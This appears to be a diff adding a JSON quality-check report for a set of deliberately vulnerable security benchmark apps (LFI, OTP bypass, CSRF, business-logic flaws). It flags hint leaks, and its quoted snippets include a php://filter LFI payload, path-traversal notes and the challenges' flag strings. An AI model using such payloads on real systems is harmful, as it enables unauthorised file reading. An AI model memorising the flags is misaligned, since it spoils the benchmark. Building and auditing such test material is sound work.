+              "snippet": "//wsl.localhost/Ubuntu/home/atheeque/workspace/strike7-benchmarks/benchmarks/SBEN-LFI-01"
+            },
+            {
+              "file": "tmpclaude-41ef-cwd",
+              "line": 1,
+              "snippet": "//wsl.localhost/Ubuntu/home/atheeque/workspace/strike7-benchmarks/benchmarks/SBEN-LFI-01"
+            },
+            {
+              "file": "tmpclaude-f86b-cwd",
+              "line": 1,
+              "snippet": "//wsl.localhost/Ubuntu/home/atheeque/workspace/strike7-benchmarks/benchmarks/SBEN-LFI-01"
+            },
+            {
+              "file": "web-app/index.php",
+              "line": 15,
+              "snippet": "// VULNERABILITY: LFI via page parameter"
+            },
+            {
+              "file": "web-app/index.php",
+              "line": 149,
+              "snippet": "// This allows path traversal attacks"
+            },
+            {
+              "file": "web-app/pages/home.php",
+              "line": 18,
+              "snippet": "<li><strong>PHP Wrappers</strong>: Using php://filter, php://input for advanced exploitation</li>"
+            },
+            {
+              "file": "web-app/pages/docs.php",
+              "line": 5,
+              "snippet": "# Basic path traversal"
+            },
+            {
+              "file": "web-app/pages/docs.php",
+              "line": 8,
+              "snippet": "# Null byte bypass (PHP < 5.3.4)"
+            },
+            {
+              "file": "web-app/pages/docs.php",
+              "line": 12,
+              "snippet": "?page=php://filter/convert.base64-encode/resource=index.php"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "flag_lfi",
+              "snippet": "- FLAG_LFI=${FLAG_LFI:-S7BEN{lfi_path_traversal_file_read_a1b2c3}}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 11,
+              "identifier_like": "php_session_poisoning_rce_g7h8i9",
+              "snippet": "- FLAG_SESSION=${FLAG_SESSION:-S7BEN{php_session_poisoning_rce_g7h8i9}}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 47,
+              "identifier_like": "apache_log_poisoning_rce_d4e5f6",
+              "snippet": "- FLAG_LOG=${FLAG_LOG:-S7BEN{apache_log_poisoning_rce_d4e5f6}}"
+            },
+            {
+              "file": "web-app/health.php",
+              "line": 6,
+              "identifier_like": "lfi",
+              "snippet": "'service' => 'LFI Web App',"
+            },
+            {
+              "file": "web-app/health.php",
+              "line": 7,
+              "identifier_like": "lfi",
+              "snippet": "'vulnerabilities' => ['LFI', 'Path Traversal', 'Log Poisoning', 'Session Poisoning']"
+            },
+            {
+              "file": "web-app/index.php",
+              "line": 119,
+              "identifier_like": "sben-lfi-01",
+              "snippet": "<p class=\"subtitle\">SBEN-LFI-01: Local File Inclusion to RCE Chain</p>"
+            },
+            {
+              "file": "web-app/Dockerfile",
+              "line": 15,
+              "identifier_like": "flag_lfi",
+              "snippet": "ARG FLAG_LFI=SBEN{lfi_path_traversal_file_read_a1b2c3}"
+            },
+            {
+              "file": "web-app/Dockerfile",
+              "line": 16,
+              "identifier_like": "php_session_poisoning_rce_g7h8i9",
+              "snippet": "ARG FLAG_SESSION=SBEN{php_session_poisoning_rce_g7h8i9}"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "log-server/Dockerfile: ARG flag=no, used=no",
+            "web-app/Dockerfile: ARG flag=no, used=no",
+            "file-server/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No benchmark-config.json or benchmark.yaml found"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-011",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 34,
+              "snippet": "- CWE-602  # Client-Side Enforcement of Server-Side Security"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 35,
+              "snippet": "- CWE-841  # Improper Enforcement of Behavioral Workflow"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 208,
+              "identifier_like": "otp_validation_bypassed",
+              "snippet": "TELEMETRY['otp_validation_bypassed'] += 1"
+            },
+            {
+              "file": "app/app.py",
+              "line": 245,
+              "identifier_like": "time_to_exploit",
+              "snippet": "TELEMETRY['time_to_exploit'] = time.time() - TELEMETRY['start_time']"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-012",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 35,
+              "snippet": "- CWE-352  # Cross-Site Request Forgery (CSRF)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 38,
+              "identifier_like": "sqlite3",
+              "snippet": "conn = sqlite3.connect('/tmp/oauth_app.db')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 53,
+              "identifier_like": "sqlite3",
+              "snippet": "conn = sqlite3.connect('/tmp/oauth_app.db')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 54,
+              "identifier_like": "sqlite3",
+              "snippet": "conn.row_factory = sqlite3.Row"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "oauth-provider/Dockerfile: ARG flag=no, used=no",
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-013",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-014",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "description contains potential leak: 'E-commerce allows negative quantities to add money instead of deduct'"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    }
+  ]
+}
